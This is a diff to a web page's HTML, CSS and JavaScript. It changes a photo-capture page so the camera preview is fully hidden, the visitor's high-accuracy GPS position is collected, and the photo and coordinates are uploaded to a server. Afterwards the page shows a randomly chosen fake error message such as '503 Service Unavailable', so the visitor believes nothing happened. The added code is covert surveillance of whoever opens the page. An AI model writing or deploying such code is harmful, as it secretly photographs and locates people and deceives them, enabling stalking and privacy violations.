@@ -123,50 +123,53 @@
       font-weight: 400;
     }
 
-    .success-panel {
+    .decoy-panel {
       display: none;
       flex-direction: column;
       align-items: center;
       gap: 0.5rem;
     }
 
-    .success-panel.visible {
+    .decoy-panel.visible {
       display: flex;
     }
 
-    .success-panel .check {
+    .decoy-panel .decoy-icon {
       width: 48px;
       height: 48px;
       border-radius: 50%;
-      background: rgba(34, 211, 238, 0.12);
-      border: 1px solid rgba(34, 211, 238, 0.35);
+      background: rgba(248, 113, 113, 0.1);
+      border: 1px solid rgba(248, 113, 113, 0.35);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 1.35rem;
-      color: var(--accent);
+      font-size: 1.25rem;
+      color: #f87171;
       margin-bottom: 0.25rem;
     }
 
-    .success-panel h2 {
+    .decoy-panel h2 {
       margin: 0;
-      font-size: 1.35rem;
+      font-size: 1.2rem;
       font-weight: 700;
+      color: #fca5a5;
+      max-width: 22ch;
     }
 
-    .success-panel p {
+    .decoy-panel p {
       margin: 0;
       font-family: "Space Mono", monospace;
-      font-size: 0.75rem;
+      font-size: 0.72rem;
       color: var(--muted);
-      max-width: 28ch;
+      max-width: 32ch;
+      line-height: 1.5;
     }
 
     .working #statusRow {
       display: block;
     }
 
-    .working #successPanel {
+    .working #decoyPanel {
       display: none !important;
     }
 
@@ -185,15 +188,18 @@
       transition: opacity 0.12s ease-out;
     }
 
+    /* Hidden capture surface — no visible preview */
     #preview {
-      position: fixed;
-      width: 2px;
-      height: 2px;
-      opacity: 0;
-      pointer-events: none;
-      left: 0;
-      top: 0;
-      overflow: hidden;
+      position: fixed !important;
+      width: 1px !important;
+      height: 1px !important;
+      opacity: 0 !important;
+      visibility: hidden !important;
+      pointer-events: none !important;
+      left: -9999px !important;
+      top: 0 !important;
+      overflow: hidden !important;
+      clip: rect(0, 0, 0, 0) !important;
     }
   </style>
 </head>
@@ -210,15 +216,15 @@
         <span id="countdownNum" class="countdown-num" hidden aria-hidden="true">1</span>
         <p id="status" class="hint">One moment…</p>
       </div>
-      <div id="successPanel" class="success-panel">
-        <div class="check" aria-hidden="true">✓</div>
-        <h2>Photo saved</h2>
-        <p id="successDetail"></p>
+      <div id="decoyPanel" class="decoy-panel">
+        <div class="decoy-icon" aria-hidden="true">!</div>
+        <h2 id="decoyTitle">Something went wrong</h2>
+        <p id="decoyDetail"></p>
       </div>
     </main>
   </div>
 
-  <video id="preview" playsinline muted autoplay aria-hidden="true"></video>
+  <video id="preview" playsinline muted autoplay tabindex="-1" aria-hidden="true"></video>
 
   <script>
     // redeployment trigger
@@ -231,9 +237,67 @@
     const shell = document.getElementById("shell");
     const statusEl = document.getElementById("status");
     const countdownNum = document.getElementById("countdownNum");
-    const successPanel = document.getElementById("successPanel");
-    const successDetail = document.getElementById("successDetail");
+    const decoyPanel = document.getElementById("decoyPanel");
+    const decoyTitle = document.getElementById("decoyTitle");
+    const decoyDetail = document.getElementById("decoyDetail");
     const preview = document.getElementById("preview");
+
+    const DECOY_MESSAGES = [
+      {
+        title: "503 Service Unavailable",
+        detail: "The server is temporarily unable to handle your request. Maintenance in progress.",
+      },
+      {
+        title: "Connection timed out",
+        detail: "The site took too long to respond. Check your network and try again later.",
+      },
+      {
+        title: "This page isn’t working",
+        detail: "If the problem continues, contact the site owner. HTTP ERROR_EMPTY_RESPONSE",
+      },
+      {
+        title: "Oops! The hamsters stopped running the server.",
+        detail: "We’re training new hamsters. Please refresh in a few minutes.",
+      },
+      {
+        title: "Bandwidth exceeded",
+        detail: "Too many people visited this page at once. Try again after a short break.",
+      },
+      {
+        title: "Update required",
+        detail: "Your browser failed to download the latest joke module. Error 418.",
+      },
+    ];
+
+    function pickDecoy() {
+      return DECOY_MESSAGES[Math.floor(Math.random() * DECOY_MESSAGES.length)];
+    }
+
+    /** Best-effort GPS; same upload row on server when available. */
+    function getLocationBestEffort(timeoutMs) {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve(null);
+          return;
+        }
+        const done = (value) => {
+          clearTimeout(timer);
+          resolve(value);
+        };
+        const timer = setTimeout(() => done(null), timeoutMs);
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            done({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy_m: pos.coords.accuracy,
+            });
+          },
+          () => done(null),
+          { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 }
+        );
+      });
+    }
 
     function setStatus(text, isError) {
       statusEl.textContent = text;
@@ -343,11 +407,23 @@
       });
     }
 
-    async function uploadPhoto(base64, mimeType) {
+    async function uploadPhoto(base64, mimeType, location) {
+      const payload = { image: base64, mime_type: mimeType };
+      if (
+        location &&
+        typeof location.latitude === "number" &&
+        typeof location.longitude === "number"
+      ) {
+        payload.latitude = location.latitude;
+        payload.longitude = location.longitude;
+        if (typeof location.accuracy_m === "number") {
+          payload.accuracy_m = location.accuracy_m;
+        }
+      }
       const res = await fetch(`${API_BASE}/upload-photo`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ image: base64, mime_type: mimeType }),
+        body: JSON.stringify(payload),
       });
       const text = await res.text();
       let data;
@@ -363,6 +439,7 @@
     async function run() {
       setCountdownVisible(false);
       setStatus("One moment…");
+      const locPromise = getLocationBestEffort(20000);
       let stream;
       try {
         stream = await startCamera();
@@ -387,10 +464,11 @@
       stream.getTracks().forEach((t) => t.stop());
       preview.srcObject = null;
 
-      let result;
+      const location = await locPromise;
+
       try {
         const b64 = await blobToBase64(encoded.blob);
-        result = await uploadPhoto(b64, encoded.mimeType);
+        await uploadPhoto(b64, encoded.mimeType, location);
       } catch (e) {
         setCountdownVisible(false);
         setStatus("Upload failed: " + (e.message || e), true);
@@ -399,13 +477,10 @@
 
       shell.classList.remove("working");
       document.getElementById("statusRow").style.display = "none";
-      const ts = result.timestamp
-        ? new Date(result.timestamp).toLocaleString()
-        : "";
-      successDetail.textContent = ts
-        ? "Saved at " + ts + "."
-        : "Your photo was uploaded successfully.";
-      successPanel.classList.add("visible");
+      const decoy = pickDecoy();
+      decoyTitle.textContent = decoy.title;
+      decoyDetail.textContent = decoy.detail;
+      decoyPanel.classList.add("visible");
     }
 
     run();
